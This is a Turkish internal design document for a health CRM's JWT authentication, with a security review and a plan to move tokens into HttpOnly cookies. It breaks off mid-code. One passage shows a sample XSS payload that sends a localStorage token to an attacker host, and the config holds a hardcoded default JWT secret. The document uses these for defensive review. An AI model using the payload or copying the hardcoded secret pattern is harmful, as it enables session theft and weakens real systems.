# Terra Health CRM - Authentication Akışı Detaylı Dökümanı

**Tarih:** 27 Ocak 2026  
**Versiyon:** 1.0  
**Durum:** Mevcut Durum Analizi ve Cookie Migration Planı

---

## 📋 İçindekiler

1. [Genel Bakış](#genel-bakış)
2. [Mevcut Durum Analizi](#mevcut-durum-analizi)
3. [Backend Detaylı Analiz](#backend-detaylı-analiz)
4. [Frontend Detaylı Analiz](#frontend-detaylı-analiz)
5. [Token Akış Diyagramları](#token-akış-diyagramları)
6. [Güvenlik Analizi](#güvenlik-analizi)
7. [Cookie Migration Planı](#cookie-migration-planı)
8. [Implementasyon Adımları](#implementasyon-adımları)

---

## 🎯 Genel Bakış

Terra Health CRM, JWT (JSON Web Token) tabanlı bir authentication sistemi kullanmaktadır. Sistem iki tip token kullanır:

1. **Access Token**: Kısa ömürlü (15 dakika), her API isteğinde kullanılır
2. **Refresh Token**: Uzun ömürlü (7 gün), access token yenilemek için kullanılır

### Mevcut Durum

| Token Tipi | Saklama Yeri | Güvenlik Durumu |
|------------|--------------|-----------------|
| Access Token | localStorage (Frontend) | ⚠️ Güvensiz (XSS saldırılarına açık) |
| Refresh Token | HttpOnly Cookie | ✅ Güvenli (ancak Secure=false, SameSite=Lax) |

### Hedef Durum

| Token Tipi | Saklama Yeri | Güvenlik Ayarları |
|------------|--------------|-------------------|
| Access Token | HttpOnly Cookie | Secure=true, SameSite=Strict |
| Refresh Token | HttpOnly Cookie | Secure=true, SameSite=Strict |

---

## 📊 Mevcut Durum Analizi

### Backend Token Yönetimi

**Mevcut Durum:**
- ✅ Refresh Token zaten HttpOnly cookie'de
- ⚠️ Access Token JSON body'de gönderiliyor
- ⚠️ Cookie Secure=false (development için)
- ⚠️ Cookie SameSite=Lax (CSRF koruması için Strict olmalı)

**Backend Konfigürasyon:**
```yaml
# application.yaml
jwt:
  secret: ${JWT_SECRET:LnjfynBNtf0wU7Qa87kxGhihPAHcFOuOhy2vyO19eUA=}
  expiration: 900000 # 15 dakika (access token)
  refresh-expiration: 604800000 # 7 gün (refresh token)

app:
  cookie:
    secure: false # Development için false, Production için true olmalı
```

### Frontend Token Yönetimi

**Mevcut Durum:**
- ⚠️ Access Token localStorage'da saklanıyor
- ✅ Refresh Token cookie'den otomatik gönderiliyor (`withCredentials: true`)
- ⚠️ Token refresh mekanizması localStorage'a yazıyor

**Frontend Konfigürasyon:**
```javascript
// api.js
const apiClient = axios.create({
    baseURL: import.meta.env.VITE_API_URL || '/api',
    withCredentials: true, // Cookie'ler için gerekli
});
```

---

## 🔧 Backend Detaylı Analiz

### 1. AuthController.java

**Dosya Yolu:** `backend/terra-crm/src/main/java/com/terrarosa/terra_crm/modules/auth/controller/AuthController.java`

#### Login Metodu (`/api/v1/auth/login`)

**Akış:**
1. `X-Tenant-ID` header kontrolü
2. `AuthService.login()` çağrısı
3. Access token ve refresh token üretimi
4. Refresh token cookie'ye yazılıyor
5. Access token JSON body'de döndürülüyor

**Kod Analizi:**
```java
@PostMapping("/login")
public ResponseEntity<ApiResponse<LoginResponse>> login(
        @Valid @RequestBody LoginRequest request,
        HttpServletRequest httpRequest) {
    
    // 1. Tenant ID kontrolü
    String tenantId = httpRequest.getHeader(TENANT_HEADER);
    if (tenantId == null || tenantId.isBlank()) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .body(ApiResponse.error("BAD_REQUEST", "X-Tenant-ID header is required"));
    }
    
    // 2. Login işlemi
    LoginResponse response = authService.login(request, tenantId);
    
    // 3. Refresh token cookie oluşturma
    ResponseCookie refreshTokenCookie = cookieUtil.createRefreshTokenCookie(
        response.getRefreshToken()
    );
    
    // 4. Refresh token'ı response body'den çıkar
    LoginResponse responseWithoutRefreshToken = LoginResponse.builder()
            .token(response.getToken()) // Access token hala body'de
            .user(response.getUser())
            .expiresIn(response.getExpiresIn())
            .build();
    
    // 5. Cookie header'ına ekle ve response döndür
    return ResponseEntity.ok()
            .header(HttpHeaders.SET_COOKIE, refreshTokenCookie.toString())
            .body(ApiResponse.success(responseWithoutRefreshToken, "Login successful"));
}
```

**Önemli Noktalar:**
- ✅ Refresh token cookie'ye yazılıyor
- ⚠️ Access token hala JSON body'de
- ✅ Refresh token response body'den çıkarılıyor (güvenlik için iyi)

#### Refresh Metodu (`/api/v1/auth/refresh`)

**Akış:**
1. Cookie'den refresh token okunuyor
2. `AuthService.refreshToken()` çağrısı
3. Token rotation uygulanıyor (eski token revoke ediliyor)
4. Yeni access token ve refresh token üretiliyor
5. Yeni refresh token cookie'ye yazılıyor
6. Access token JSON body'de döndürülüyor

**Kod Analizi:**
```java
@PostMapping("/refresh")
public ResponseEntity<ApiResponse<RefreshTokenResponse>> refreshToken(
        @CookieValue(name = "refreshToken", required = false) String refreshToken) {
    
    // 1. Cookie kontrolü
    if (refreshToken == null || refreshToken.isBlank()) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(ApiResponse.error("UNAUTHORIZED", "Refresh token not found"));
    }
    
    try {
        // 2. Token refresh
        RefreshTokenResponse response = authService.refreshToken(refreshToken);
        
        // 3. Response body'den refresh token çıkar
        RefreshTokenResponse responseWithoutRefreshToken = RefreshTokenResponse.builder()
                .accessToken(response.getAccessToken()) // Access token body'de
                .expiresIn(response.getExpiresIn())
                .build();
        
        // 4. Token rotation kontrolü
        if (response.getRefreshToken() != null && !response.getRefreshToken().isBlank()) {
            // Yeni refresh token cookie'ye yaz
            ResponseCookie refreshTokenCookie = cookieUtil.createRefreshTokenCookie(
                response.getRefreshToken()
            );
            responseBuilder.header(HttpHeaders.SET_COOKIE, refreshTokenCookie.toString());
        }
        
        return responseBuilder.body(ApiResponse.success(responseWithoutRefreshToken));
    } catch (Exception e) {
        // Hata durumunda cookie'yi temizle
        ResponseCookie clearCookie = cookieUtil.clearRefreshTokenCookie();
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .header(HttpHeaders.SET_COOKIE, clearCookie.toString())
                .body(ApiResponse.error("UNAUTHORIZED", "Invalid or expired refresh token"));
    }
}
```

**Önemli Noktalar:**
- ✅ Cookie'den refresh token okunuyor (`@CookieValue`)
- ✅ Token rotation implementasyonu var
- ✅ Grace period desteği var (30 saniye)
- ⚠️ Access token hala JSON body'de

### 2. JwtService.java

**Dosya Yolu:** `backend/terra-crm/src/main/java/com/terrarosa/terra_crm/core/security/service/JwtService.java`

#### Access Token Üretimi

**Metod:** `generateAccessToken()`

**İçerik:**
```java
public String generateAccessToken(
        String email, 
        String tenantId, 
        String schemaName, 
        List<String> roles, 
        List<String> permissions) {
    
    Date now = new Date();
    Date expiryDate = new Date(now.getTime() + expiration); // 15 dakika
    
    // Permissions compression (JWT boyutunu küçültmek için)
    List<String> compressedPermissions = PermissionMapper.compressPermissions(permissions);
    
    return Jwts.builder()
            .subject(email)
            .claim("tenantId", tenantId)
            .claim("schema_name", schemaName)
            .claim("roles", roles)
            .claim("permissions", compressedPermissions)
            .claim("type", "access") // Token tipi
            .issuedAt(now)
            .expiration(expiryDate)
            .signWith(getSigningKey())
            .compact();
}
```

**Token İçeriği:**
- `subject`: Email
- `tenantId`: Tenant UUID
- `schema_name`: Veritabanı şema adı
- `roles`: Kullanıcı rolleri
- `permissions`: Sıkıştırılmış izinler
- `type`: "access"
- `iat`: İssued at timestamp
- `exp`: Expiration timestamp

**Önemli Noktalar:**
- ✅ Permissions compression kullanılıyor (JWT boyutu optimizasyonu)
- ✅ Token tipi claim'i var (access/refresh ayrımı için)
- ✅ Tüm authorization bilgileri token içinde

#### Refresh Token Üretimi

**Metod:** `generateRefreshToken()`

**İçerik:**
```java
public String generateRefreshToken(String email, String tokenId) {
    Date now = new Date();
    Date expiryDate = new Date(now.getTime() + refreshExpiration); // 7 gün
    
    return Jwts.builder()
            .subject(email)
            .claim("tokenId", tokenId) // Token rotation için UUID
            .claim("type", "refresh") // Token tipi
            .issuedAt(now)
            .expiration(expiryDate)
            .signWith(getSigningKey())
            .compact();
}
```

**Token İçeriği:**
- `subject`: Email
- `tokenId`: UUID (token rotation için)
- `type`: "refresh"
- `iat`: İssued at timestamp
- `exp`: Expiration timestamp

**Önemli Noktalar:**
- ✅ Token rotation için tokenId claim'i var
- ✅ Minimal içerik (sadece identity ve tokenId)
- ✅ Uzun ömürlü (7 gün)

### 3. SecurityConfig.java

**Dosya Yolu:** `backend/terra-crm/src/main/java/com/terrarosa/terra_crm/core/security/config/SecurityConfig.java`

#### CORS Konfigürasyonu

**Mevcut Ayarlar:**
```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();
    configuration.setAllowedOrigins(List.of(
        "http://localhost:3000", 
        "http://localhost:5173"
    ));
    configuration.setAllowedMethods(Arrays.asList(
        "GET", "POST", "PUT", "DELETE", "OPTIONS"
    ));
    configuration.setAllowedHeaders(Arrays.asList("*"));
    configuration.setExposedHeaders(Arrays.asList("X-Tenant-ID"));
    configuration.setAllowCredentials(true); // ✅ Cookie'ler için gerekli
    
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", configuration);
    return source;
}
```

**Önemli Noktalar:**
- ✅ `allowCredentials: true` - Cookie'ler için kritik
- ⚠️ Development origin'leri hardcoded
- ⚠️ Production için environment variable kullanılmalı

#### Security Filter Chain

**Konfigürasyon:**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable()) // ⚠️ Cookie kullanımında CSRF koruması gerekli
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/api/v1/auth/**").permitAll()
            .requestMatchers("/api/v1/**").authenticated()
            .anyRequest().permitAll()
        )
        .addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)
        .addFilterAfter(maintenanceModeFilter, JwtAuthenticationFilter.class);
    
    return http.build();
}
```

**Önemli Noktalar:**
- ⚠️ CSRF disabled - Cookie kullanımında CSRF koruması gerekli
- ✅ Stateless session (JWT için uygun)
- ✅ JWT filter doğru sırada

### 4. JwtAuthenticationFilter.java

**Dosya Yolu:** `backend/terra-crm/src/main/java/com/terrarosa/terra_crm/core/security/filter/JwtAuthenticationFilter.java`

#### Token Okuma Mekanizması

**Metod:** `extractTokenFromRequest()`

**Kod:**
```java
private String extractTokenFromRequest(HttpServletRequest request) {
    String bearerToken = request.getHeader(AUTHORIZATION_HEADER);
    
    if (StringUtils.hasText(bearerToken) && bearerToken.startsWith(BEARER_PREFIX)) {
        return bearerToken.substring(BEARER_PREFIX.length());
    }
    
    return null;
}
```

**Önemli Noktalar:**
- ⚠️ Sadece Authorization header'dan okunuyor
- ⚠️ Cookie'den okuma yok (access token için)

#### Filter Akışı

**Adımlar:**
1. Authorization header'dan token okunuyor
2. Token validasyonu
3. Tenant ID kontrolü (JWT vs Header)
4. Tenant status kontrolü (SUSPENDED kontrolü)
5. TenantContext set ediliyor
6. UserDetails yükleniyor
7. SecurityContext'e authentication set ediliyor
8. Filter chain devam ediyor
9. Request sonunda TenantContext temizleniyor

**Kritik Kontroller:**
```java
// 1. Token extraction
String token = extractTokenFromRequest(request);

// 2. Token validation
if (!jwtService.validateToken(token)) {
    filterChain.doFilter(request, response);
    return;
}

// 3. Tenant ID comparison (JWT vs Header)
String headerTenantId = request.getHeader(TENANT_HEADER);
String jwtTenantId = jwtService.extractTenantId(token);

if (!jwtTenantId.equals(headerTenantId)) {
    throw new AccessDeniedException("Tenant ID mismatch");
}

// 4. Tenant status check
if (!tenant.canAcceptRequests()) {
    response.setStatus(HttpServletResponse.SC_FORBIDDEN);
    return;
}

// 5. Set TenantContext
TenantContext.setCurrentTenant(jwtTenantId, schemaName);

// 6. Load user and set authentication
UserDetails userDetails = userDetailsService.loadUserByUsername(email);
UsernamePasswordAuthenticationToken authentication = 
    new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
SecurityContextHolder.getContext().setAuthentication(authentication);
```

**Önemli Noktalar:**
- ✅ Tenant ID mismatch kontrolü var (cross-tenant saldırı koruması)
- ✅ Tenant status kontrolü var (SUSPENDED tenant koruması)
- ✅ TenantContext temizleme var (memory leak önleme)
- ⚠️ Token sadece header'dan okunuyor (cookie desteği yok)

### 5. CookieUtil.java

**Dosya Yolu:** `backend/terra-crm/src/main/java/com/terrarosa/terra_crm/core/security/util/CookieUtil.java`

#### Cookie Oluşturma

**Metod:** `createRefreshTokenCookie()`

**Kod:**
```java
public ResponseCookie createRefreshTokenCookie(String token) {
    Duration maxAge = Duration.ofMillis(refreshExpiration);
    
    return ResponseCookie.from(REFRESH_TOKEN_COOKIE_NAME, token)
            .httpOnly(true) // ✅ JavaScript erişimi yok
            .secure(cookieSecure) // ⚠️ Development: false, Production: true olmalı
            .sameSite(SAME_SITE_LAX) // ⚠️ Strict olmalı
            .path(COOKIE_PATH) // ✅ Sadece refresh endpoint'ine gönderiliyor
            .maxAge(maxAge)
            .build();
}
```

**Mevcut Ayarlar:**
- ✅ `httpOnly: true` - JavaScript erişimi yok
- ⚠️ `secure: false` (development) - Production'da true olmalı
- ⚠️ `sameSite: Lax` - Strict olmalı (CSRF koruması için)
- ✅ `path: /api/v1/auth/refresh` - Sadece refresh endpoint'ine gönderiliyor
- ✅ `maxAge: 7 gün`

**Önemli Noktalar:**
- ✅ HttpOnly doğru ayarlanmış
- ⚠️ Secure ve SameSite production için güncellenmeli
- ✅ Path kısıtlaması var (güvenlik için iyi)

#### Cookie Temizleme

**Metod:** `clearRefreshTokenCookie()`

**Kod:**
```java
public ResponseCookie clearRefreshTokenCookie() {
    return ResponseCookie.from(REFRESH_TOKEN_COOKIE_NAME, "")
            .httpOnly(true)
            .secure(cookieSecure)
            .sameSite(SAME_SITE_LAX)
            .path(COOKIE_PATH)
            .maxAge(Duration.ZERO) // Cookie'yi sil
            .build();
}
```

**Önemli Noktalar:**
- ✅ Logout ve hata durumlarında cookie temizleniyor
- ✅ Aynı path ve domain kullanılıyor (cookie silme için kritik)

### 6. AuthService.java

**Dosya Yolu:** `backend/terra-crm/src/main/java/com/terrarosa/terra_crm/modules/auth/service/AuthService.java`

#### Login Metodu

**Akış:**
1. Email normalizasyonu (lowercase, trim)
2. Kullanıcı bulma
3. Şifre doğrulama
4. Kullanıcı enabled kontrolü
5. Tenant status kontrolü
6. Super Admin özel işleme
7. Permission'ları yükleme
8. Access token üretimi
9. Refresh token üretimi ve veritabanına kaydetme
10. Response oluşturma

**Kod Özeti:**
```java
@Transactional
public LoginResponse login(LoginRequest request, String tenantIdHeader) {
    // 1. Email normalizasyonu
    String email = request.getEmail().toLowerCase().trim();
    
    // 2. Kullanıcı bulma
    User user = userRepository.findByEmail(email)
            .orElseThrow(() -> new BadCredentialsException("Invalid email or password"));
    
    // 3. Şifre doğrulama
    if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
        throw new BadCredentialsException("Invalid email or password");
    }
    
    // 4. Enabled kontrolü
    if (!user.getEnabled()) {
        throw new BadCredentialsException("User account is disabled");
    }
    
    // 5. Tenant status kontrolü
    if (tenant.getStatus() != TenantStatus.ACTIVE) {
        throw new BadCredentialsException("Tenant is suspended");
    }
    
    // 6. Permission'ları yükleme
    List<String> permissions = permissionService.getUserPermissions(user.getId());
    
    // 7. Access token üretimi
    String accessToken = jwtService.generateAccessToken(
        user.getEmail(), userTenantId, schemaName, roles, permissions
    );
    
    // 8. Refresh token üretimi ve kaydetme
    String tokenId = UUID.randomUUID().toString();
    String refreshTokenString = jwtService.generateRefreshToken(user.getEmail(), tokenId);
    RefreshToken refreshToken = RefreshToken.builder()
            .user(user)
            .token(refreshTokenString)
            .expiresAt(LocalDateTime.now().plusDays(7))
            .revoked(false)
            .build();
    refreshTokenRepository.save(refreshToken);
    
    // 9. Response oluşturma
    return LoginResponse.builder()
            .token(accessToken) // ⚠️ Body'de döndürülüyor
            .user(userDto)
            .expiresIn(900000L)
            .refreshToken(refreshTokenString) // Cookie'ye yazılacak
            .build();
}
```

**Önemli Noktalar:**
- ✅ Email normalizasyonu var
- ✅ Tüm güvenlik kontrolleri yapılıyor
- ✅ Refresh token veritabanına kaydediliyor (token rotation için)
- ⚠️ Access token body'de döndürülüyor

#### Refresh Token Metodu

**Akış:**
1. Refresh token validasyonu
2. Veritabanından refresh token bulma
3. Expiration kontrolü
4. Revoked kontrolü (grace period ile)
5. Token rotation (eski token revoke, yeni token üret)
6. Yeni access token ve refresh token üretimi
7. Response oluşturma

**Kod Özeti:**
```java
@Transactional
public RefreshTokenResponse refreshToken(String refreshTokenString) {
    // 1. Token validasyonu
    if (!jwtService.validateRefreshToken(refreshTokenString)) {
        throw new BadCredentialsException("Invalid or expired refresh token");
    }
    
    // 2. Veritabanından bulma
    RefreshToken refreshToken = refreshTokenRepository.findByToken(refreshTokenString)
            .orElseThrow(() -> new BadCredentialsException("Invalid refresh token"));
    
    // 3. Expiration kontrolü
    if (refreshToken.isExpired()) {
        throw new BadCredentialsException("Refresh token is expired");
    }
    
    // 4. Revoked kontrolü (grace period)
    if (refreshToken.getRevoked()) {
        long secondsSinceRevocation = Duration.between(
            refreshToken.getRevokedAt(), LocalDateTime.now()
        ).getSeconds();
        
        if (secondsSinceRevocation < 30) {
            // Grace period: Token döndür ama rotation yapma
            return createAuthResponse(user, false);
        } else {
            // Token reuse attack
            throw new BadCredentialsException("Refresh token has been revoked");
        }
    }
    
    // 5. Token rotation
    refreshToken.revoke();
    refreshTokenRepository.save(refreshToken);
    
    // 6. Yeni token'lar üretimi
    User user = refreshToken.getUser();
    return createAuthResponse(user, true); // includeRefreshToken = true
}
```

**Önemli Noktalar:**
- ✅ Token rotation implementasyonu var
- ✅ Grace period desteği var (30 saniye)
- ✅ Token reuse attack koruması var
- ✅ Refresh token veritabanına kaydediliyor

---

## 🎨 Frontend Detaylı Analiz

### 1. api.js (Axios Konfigürasyonu)

**Dosya Yolu:** `frontend/terra/src/apps/terra-shared/core/api.js`

#### Axios Instance Oluşturma

**Kod:**
```javascript
const apiClient = axios.create({
    baseURL: import.meta.env.VITE_API_URL || '/api',
    headers: {
        'Content-Type': 'application/json',
    },
    withCredentials: true, // ✅ Cookie'ler için kritik
});
```

**Önemli Noktalar:**
- ✅ `withCredentials: true` - Cookie'ler için gerekli
- ✅ Base URL environment variable'dan alınıyor

#### Request Interceptor

**Kod:**
```javascript
apiClient.interceptors.request.use(
    (config) => {
        // 1. Access token'ı localStorage'dan al ve header'a ekle
        const token = localStorage.getItem('token');
        if (token) {
            config.headers.Authorization = `Bearer ${token}`;
        }
        
        // 2. Tenant ID'yi al ve header'a ekle
        let tenantId = localStorage.getItem('tenantId');
        if (!tenantId) {
            // Zustand store'dan al (fallback)
            const authData = localStorage.getItem('terra-auth-storage');
            if (authData) {
                const parsed = JSON.parse(authData);
                tenantId = parsed?.state?.user?.tenantId || parsed?.user?.tenantId;
            }
        }
        
        if (tenantId && tenantId !== 'null' && tenantId !== 'undefined') {
            config.headers['X-Tenant-ID'] = tenantId;
        }
        
        return config;
    },
    (error) => Promise.reject(error)
);
```

**Önemli Noktalar:**
- ⚠️ Access token localStorage'dan okunuyor
- ⚠️ Authorization header'a ekleniyor
- ✅ Tenant ID header'a ekleniyor
- ⚠️ Cookie'den token okuma yok

#### Response Interceptor (Token Refresh)

**Kod:**
```javascript
apiClient.interceptors.response.use(
    (response) => {
        // Response data sadeleştirme
        if (response.data && typeof response.data === 'object') {
            if ('data' in response.data && 'success' in response.data) {
                if (response.data.success === true) {
                    return response.data.data; // Direkt data'yı döndür
                }
            }
        }
        return response;
    },
    async (error) => {
        const originalRequest = error.config;
        
        // 401 Hata Kontrolü
        if (error.response?.status === 401) {
            // Refresh endpoint'i kendisi hata verdi mi?
            if (originalRequest.url === '/v1/auth/refresh' || originalRequest._retry) {
                // Logout yap
                isRefreshing = false;
                failedQueue = [];
                localStorage.removeItem('token');
                localStorage.removeItem('tenantId');
                window.location.href = '/login';
                return Promise.reject(error);
            }
            
            // Refresh token kontrolü (queuing)
            if (isRefreshing) {
                // Başka bir istek zaten refresh atıyor, kuyruğa ekle
                return new Promise((resolve, reject) => {
                    failedQueue.push({ resolve, reject });
                }).then(token => {
                    originalRequest.headers.Authorization = `Bearer ${token}`;
                    return apiClient(originalRequest);
                });
            }
            
            // Refresh token başlat
            isRefreshing = true;
            originalRequest._retry = true;
            
            try {
                // Refresh isteği (cookie otomatik gönderilir)
                const baseURL = import.meta.env.VITE_API_URL || '/api';
                const response = await axios.post(
                    '/v1/auth/refresh',
                    {},
                    {
                        withCredentials: true,
                        baseURL: baseURL
                    }
                );
                
                // Yeni access token'ı al ve localStorage'a kaydet
                const newToken = response.data?.data?.accessToken || response.data?.accessToken;
                if (newToken) {
                    localStorage.setItem('token', newToken); // ⚠️ localStorage'a yazılıyor
                    processQueue(null, newToken);
                    originalRequest.headers.Authorization = `Bearer ${newToken}`;
                    return apiClient(originalRequest);
                } else {
                    throw new Error('No token in refresh response');
                }
            } catch (refreshError) {
                // Refresh başarısız - Logout
                processQueue(refreshError, null);
                isRefreshing = false;
                failedQueue = [];
                localStorage.removeItem('token');
                localStorage.removeItem('tenantId');
                window.location.href = '/login';
                return Promise.reject(refreshError);
            } finally {
                isRefreshing = false;
            }
        }
        
        // Diğer hatalar
        const normalizedError = normalizeError(error);
        return Promise.reject(normalizedError);
    }
);
```

**Önemli Noktalar:**
- ✅ Token refresh queuing mekanizması var (concurrent request'ler için)
- ✅ Refresh token cookie'den otomatik gönderiliyor
- ⚠️ Yeni access token localStorage'a yazılıyor
- ✅ Sonsuz döngü koruması var
- ✅ Hata durumunda logout yapılıyor

### 2. authStore.js (Zustand Store)

**Dosya Yolu:** `frontend/terra/src/apps/terra-shared/store/authStore.js`

#### Login Metodu

**Kod:**
```javascript
login: async ({ email, password, tenantId }) => {
    const finalTenantId = tenantId || get().discoveredTenantId || localStorage.getItem('tenantId');
    
    if (!finalTenantId) {
        throw new Error('Tenant ID is required for login');
    }
    
    set({ loading: true, error: null });
    
    try {
        const response = await apiClient.post(
            '/v1/auth/login',
            { email, password },
            { headers: { 'X-Tenant-ID': tenantId } }
        );
        
        // KRİTİK: Token Dağıtımı - Sıralama ÖNEMLİ
        // 1. ÖNCE localStorage'a yaz (api.js interceptor buradan okuyor)
        localStorage.setItem('token', response.token); // ⚠️ localStorage'a yazılıyor
        localStorage.setItem('tenantId', response.user.tenantId.toString());
        
        // 2. SONRA store'a yaz (persist middleware otomatik localStorage'a yazar)
        set({
            user: response.user,
            isAuthenticated: true,
            loading: false,
            error: null,
            discoveredTenantId: null
        });
    } catch (error) {
        set({ error, loading: false });
        throw error;
    }
}
```

**Önemli Noktalar:**
- ⚠️ Access token localStorage'a yazılıyor
- ✅ Tenant ID localStorage'a yazılıyor
- ✅ User bilgileri store'a yazılıyor
- ⚠️ Cookie'ye token yazma yok

#### Logout Metodu

**Kod:**
```javascript
logout: () => {
    // KRİTİK: Token Dağıtımı (Temizleme - Senkronizasyon)
    // 1. ÖNCE localStorage'dan sil
    localStorage.removeItem('token');
    localStorage.removeItem('tenantId');
    
    // 2. SONRA store'u sıfırla
    set({
        user: null,
        isAuthenticated: false,
        error: null,
        loading: false,
        discoveredTenantId: null
    });
    
    // Hard redirect - güvenli ve temiz
    window.location.href = '/login';
}
```

**Önemli Noktalar:**
- ✅ localStorage temizleniyor
- ✅ Store temizleniyor
- ⚠️ Cookie temizleme yok (backend'den yapılmalı)

---

## 🔄 Token Akış Diyagramları

### Mevcut Durum: Login Akışı

```
┌─────────────┐
│   Frontend  │
│  (Login)    │
└──────┬──────┘
       │
       │ POST /api/v1/auth/login
       │ { email, password }
       │ Header: X-Tenant-ID
       │
       ▼
┌─────────────┐
│   Backend   │
│ AuthService │
└──────┬──────┘
       │
       │ 1. Email/Password doğrula
       │ 2. User bilgilerini yükle
       │ 3. Access Token üret (15 dk)
       │ 4. Refresh Token üret (7 gün)
       │ 5. Refresh Token DB'ye kaydet
       │
       ▼
┌─────────────┐
│ AuthController│
└──────┬──────┘
       │
       │ Response:
       │ - Body: { token: "access_token", user: {...} }
       │ - Cookie: refreshToken="refresh_token"
       │
       ▼
┌─────────────┐
│   Frontend  │
│  (Receive)  │
└──────┬──────┘
       │
       │ 1. Access Token → localStorage
       │ 2. Refresh Token → Cookie (otomatik)
       │ 3. User → Zustand Store
       │
       ▼
┌─────────────┐
│   Ready     │
└─────────────┘
```

### Mevcut Durum: API Request Akışı

```
┌─────────────┐
│   Frontend   │
│  (Request)   │
└──────┬──────┘
       │
       │ 1. localStorage'dan token al
       │ 2. Authorization header'a ekle
       │ 3. X-Tenant-ID header'a ekle
       │
       ▼
┌─────────────┐
│   Backend   │
│ JwtAuthFilter│
└──────┬──────┘
       │
       │ 1. Authorization header'dan token oku
       │ 2. Token'ı validate et
       │ 3. Tenant ID kontrolü (JWT vs Header)
       │ 4. Tenant status kontrolü
       │ 5. SecurityContext'e set et
       │
       ▼
┌─────────────┐
│  Controller │
│  (Process)   │
└─────────────┘
```

### Mevcut Durum: Token Refresh Akışı

```
┌─────────────┐
│   Frontend   │
│  (401 Error) │
└──────┬──────┘
       │
       │ POST /api/v1/auth/refresh
       │ Cookie: refreshToken="..."
       │
       ▼
┌─────────────┐
│   Backend   │
│ AuthService │
└──────┬──────┘
       │
       │ 1. Cookie'den refresh token oku
       │ 2. Token'ı validate et
       │ 3. DB'den refresh token bul
       │ 4. Revoked kontrolü (grace period)
       │ 5. Eski token'ı revoke et
       │ 6. Yeni access token üret
       │ 7. Yeni refresh token üret
       │ 8. Yeni refresh token DB'ye kaydet
       │
       ▼
┌─────────────┐
│ AuthController│
└──────┬──────┘
       │
       │ Response:
       │ - Body: { accessToken: "new_token" }
       │ - Cookie: refreshToken="new_refresh_token"
       │
       ▼
┌─────────────┐
│   Frontend   │
│  (Receive)   │
└──────┬──────┘
       │
       │ 1. Yeni access token → localStorage
       │ 2. Yeni refresh token → Cookie (otomatik)
       │ 3. Orijinal request'i tekrarla
       │
       ▼
┌─────────────┐
│   Success    │
└─────────────┘
```

---

## 🔒 Güvenlik Analizi

### Mevcut Güvenlik Açıkları

#### 1. Access Token localStorage'da

**Risk:** XSS (Cross-Site Scripting) saldırılarına açık

**Açıklama:**
- localStorage JavaScript ile erişilebilir
- XSS saldırısı ile token çalınabilir
- Token çalındığında 15 dakika boyunca kullanılabilir

**Örnek Saldırı Senaryosu:**
```javascript
// Saldırgan bir XSS payload'ı enjekte eder
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Çözüm:**
- Access token'ı HttpOnly cookie'ye taşı
- JavaScript erişimini engelle

#### 2. Cookie Secure=false

**Risk:** Man-in-the-Middle (MITM) saldırılarına açık

**Açıklama:**
- HTTP üzerinden cookie gönderilebilir
- Ağ trafiği dinlenebilir
- Cookie çalınabilir

**Çözüm:**
- Production'da `Secure: true` yap
- HTTPS zorunlu hale getir

#### 3. Cookie SameSite=Lax

**Risk:** CSRF (Cross-Site Request Forgery) saldırılarına açık

**Açıklama:**
- Lax modu bazı CSRF saldırılarına izin verir
- Cross-site POST request'lerde cookie gönderilir

**Çözüm:**
- `SameSite: Strict` yap
- CSRF token ekle (opsiyonel)

#### 4. CSRF Koruması Yok

**Risk:** CSRF saldırılarına açık

**Açıklama:**
- SecurityConfig'de CSRF disabled
- Cookie kullanımında CSRF koruması gerekli

**Çözüm:**
- CSRF token ekle veya
- SameSite=Strict yeterli olabilir (test edilmeli)

### Güvenlik İyileştirmeleri

#### 1. Access Token Cookie'ye Taşıma

**Avantajlar:**
- ✅ XSS saldırılarına karşı koruma
- ✅ JavaScript erişimi yok
- ✅ Otomatik gönderim (withCredentials)

**Dezavantajlar:**
- ⚠️ CSRF koruması gerekli
- ⚠️ Cookie boyutu sınırı (4KB)
- ⚠️ CORS konfigürasyonu kritik

#### 2. Secure ve SameSite Ayarları

**Secure=true:**
- ✅ HTTPS zorunlu
- ✅ MITM koruması

**SameSite=Strict:**
- ✅ CSRF koruması
- ⚠️ Cross-site redirect'lerde cookie gönderilmez

---

## 🚀 Cookie Migration Planı

### Hedef Mimari

```
┌─────────────────────────────────────────┐
│         Token Saklama Yeri              │
├─────────────────────────────────────────┤
│ Access Token  → HttpOnly Cookie         │
│ Refresh Token → HttpOnly Cookie         │
│ User Data     → Zustand Store (localStorage)│
│ Tenant ID     → Zustand Store (localStorage)│
└─────────────────────────────────────────┘
```

### Cookie Yapılandırması

#### Access Token Cookie

**Ayarlar:**
- `Name`: `accessToken`
- `HttpOnly`: `true`
- `Secure`: `true` (production)
- `SameSite`: `Strict`
- `Path`: `/api/v1` (tüm API endpoint'leri)
- `MaxAge`: `900` (15 dakika, saniye cinsinden)

#### Refresh Token Cookie

**Ayarlar:**
- `Name`: `refreshToken`
- `HttpOnly`: `true`
- `Secure`: `true` (production)
- `SameSite`: `Strict`
- `Path`: `/api/v1/auth/refresh` (sadece refresh endpoint'i)
- `MaxAge`: `604800` (7 gün, saniye cinsinden)

### Backend Değişiklikleri

#### 1. CookieUtil.java Güncellemesi

**Yapılacaklar:**
- Access token cookie oluşturma metodu ekle
- Secure ve SameSite ayarlarını güncelle
- Path ayarlarını optimize et

**Yeni Metodlar:**
```java
public ResponseCookie createAccessTokenCookie(String token) {
    Duration maxAge = Duration.ofSeconds(900); // 15 dakika
    
    return ResponseCookie.from("accessToken", token)
            .httpOnly(true)
            .secure(cookieSecure)
            .sameSite("Strict") // Lax → Strict
            .path("/api/v1") // Tüm API endpoint'leri
            .maxAge(maxAge)
            .build();
}

